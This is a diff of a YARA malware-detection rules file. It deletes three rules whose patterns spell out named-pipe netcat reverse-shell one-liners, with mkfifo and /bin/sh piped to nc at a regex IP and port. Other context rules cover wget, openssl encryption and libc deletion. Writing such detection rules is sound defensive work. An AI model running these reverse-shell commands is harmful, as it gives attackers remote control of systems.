@@ -183,31 +183,6 @@ rule Malicious_Wget_With_O {
     condition:
         all of ($pattern1, $pattern2)
 }
-
-rule Malicious_Fifo_Pipe_Netcat {
-    meta:
-        description = "YARA rule to detect the creation of a named pipe and use of netcat for communication"
-        author = "Emirhan Ucan"
-    
-    strings:
-        $pattern1 = "mkfifo /tmp/backpipe; /bin/sh 0</tmp/backpipe | nc \\d+\\.\\d+\\.\\d+\\.\\d+ \\d+ 1>/tmp/backpipe"
-
-    condition:
-        $pattern1
-}
-
-rule Malicious_Fifo_Pipe_Shell_Netcat {
-    meta:
-        description = "YARA rule to detect the creation of a named pipe, running a shell, and using netcat for communication"
-        author = "Emirhan Ucan"
-    
-    strings:
-        $pattern1 = "mkfifo /tmp/fifo; cat /tmp/fifo | /bin/sh -i 2>&1 | nc \\d+\\.\\d+\\.\\d+\\.\\d+ \\d+ > /tmp/fifo"
-
-    condition:
-        $pattern1
-}
-
 rule Malicious_OpenSSL_Enc {
     meta:
         description = "YARA rule to detect the 'openssl enc -aes-256-cbc' pattern indicating potential malicious behavior"
@@ -267,19 +242,6 @@ rule Malicious_Remove_Libc_So6 {
     condition:
         $pattern1
 }
-
-rule Malicious_Fifo {
-    meta:
-        description = "YARA rule to detect the creation of a named pipe and command execution indicating potential malicious behavior"
-        author = "Emirhan Ucan"
-    
-    strings:
-        $pattern1 = "mkfifo /\\w+/\\w+; \\S+ /\\w+/\\w+ | \\S+ \\d+\\.\\d+\\.\\d+\\.\\d+ \\d+"
-
-    condition:
-        $pattern1
-}
-
 rule Malicious_Shell {
     meta:
         description = "YARA rule to detect the execution of a shell command indicating potential malicious behavior"
